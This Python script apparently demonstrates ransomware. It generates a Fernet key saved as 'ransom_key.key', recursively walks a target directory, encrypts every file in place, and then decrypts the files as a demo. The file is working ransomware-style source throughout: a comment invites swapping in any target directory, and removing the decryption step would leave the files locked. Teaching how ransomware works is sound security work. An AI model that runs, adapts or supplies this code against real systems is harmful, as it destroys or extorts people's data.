from cryptography.fernet import Fernet
import os
#Generate a key for encryption and decryption
def generate_key():
    key = Fernet.generate_key() #Creating a unique encryptio key
    with open("ransom_key.key","wb") as key_file: #Storing key in a file
        key_file.write(key)

#Loading the encryption key from file
def load_key():
    return open("ransom_key.key", "rb").read() #Reading key from the file

#Encrypt a file
def encrypt_file(file_path, key):
    fernet=Fernet(key) #Initialize encryption method with the key
    with open(file_path, "rb") as file:
        file_data=file.read() #Reading file data
    encrypted_data = fernet.encrypt(file_data) #Encrypting data
    with open(file_path,"wb") as file:
        file.write(encrypted_data) #Writing encrypted data back to file
    print(f"[+] {file_path} has been encrypted.") #Log success

# Decrypt a file
def decrypt_file(file_path, key):
    fernet = Fernet(key) #Initializes decryption method with key
    with open(file_path, "rb") as file:
        encrypted_data = file.read() #Reads encrypted data
    decrypted_data = fernet.decrypt(encrypted_data) #Decrypting data
    with open(file_path,"wb") as file:
        file.write(decrypted_data) #Writing decrypted data back to file
    print(f"[+] {file_path} has been decrypted.") #Log success

#Encrypt files in a directory
def encrypt_file_in_directory(directory, key):
    for root, dirs, files in os.walk(directory): #Scanning through records
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key) #Encrypting each file found


#Main Function
def main():
    target_directory = "testing_folder" #Replace with own target directory

    # Generate encryption key if it does not exist
    if not os.path.exists("ransom_key.key"):
        generate_key()
        print("[*] Encryption key generated.")

    key = load_key() # Load generated key
    print("[*] Key loaded, Encrypting files...")

    # Encrypt files in target directory
    encrypt_file_in_directory(target_directory, key)

    # Decrypt Files to demo
    print("[*] Decrypting files...")
    for root, dirs, files in os.walk(target_directory):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt_file(file_path, key) # Decrypting files



if __name__ == "__main__":
    main()